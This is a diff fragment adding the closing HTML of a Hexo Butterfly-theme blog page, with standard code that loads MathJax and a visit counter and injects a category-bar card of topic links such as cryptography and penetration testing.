+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><script type="text/javascript" src="/js/daliyuer.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_categories_card_injector_config(){
+    // 检查容器是否存在
+    var parent_div_git = document.getElementById('recent-posts');
+    // 如果容器不存在，则动态创建
+    if (!parent_div_git) {
+      console.warn('butterfly_categories_card: 挂载容器不存在，正在动态创建...');
+      // 创建新容器（默认插入到页面主体顶部）
+      parent_div_git = document.createElement('div');
+      parent_div_git.id = 'recent-posts'; // 赋予配置的ID
+      document.querySelector('#page').prepend(parent_div_git); // 插入到 #content-inner 内
+    }
+    var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 950px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 800px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7955.jpg);"> <a class="categoryBar-list-link" href="/categories/项目作品/">项目作品</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr">1</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7957.jpg);"> <a class="categoryBar-list-link" href="/categories/密码学/">密码学</a><span class="categoryBar-list-count">6</span><span class="categoryBar-list-descr">2</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7958.jpg);"> <a class="categoryBar-list-link" href="/categories/随笔/">随笔</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">3</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc795a.jpg);"> <a class="categoryBar-list-link" href="/categories/建站与运维/">建站与运维</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr">4</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7956.jpg);"> <a class="categoryBar-list-link" href="/categories/数据结构与算法/">数据结构与算法</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr">5</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7959.jpg);"> <a class="categoryBar-list-link" href="/categories/知识库/">知识库</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr">6</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7a43203f7be00cc79cf.jpg);"> <a class="categoryBar-list-link" href="/categories/渗透测试/">渗透测试</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">7</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7a43203f7be00cc79ce.jpg);"> <a class="categoryBar-list-link" href="/categories/数据安全与隐私/">数据安全与隐私</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">8</span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/开发环境/">开发环境</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/操作系统/">操作系统</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/工具与效率/">工具与效率</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/逆向工程/">逆向工程</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/机器学习/">机器学习</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/计算机网络/">计算机网络</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr"></span></li></ul></div></div>';
+    console.log('已挂载 butterfly_categories_card');
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+  }
+  // 路径匹配逻辑（使用 startsWith）
+  if (location.pathname.startsWith('/categories/') || '/categories/' === 'all') {
+    butterfly_categories_card_injector_config();
+  }
+  </script><!-- hexo injector body_end end --></body></html>
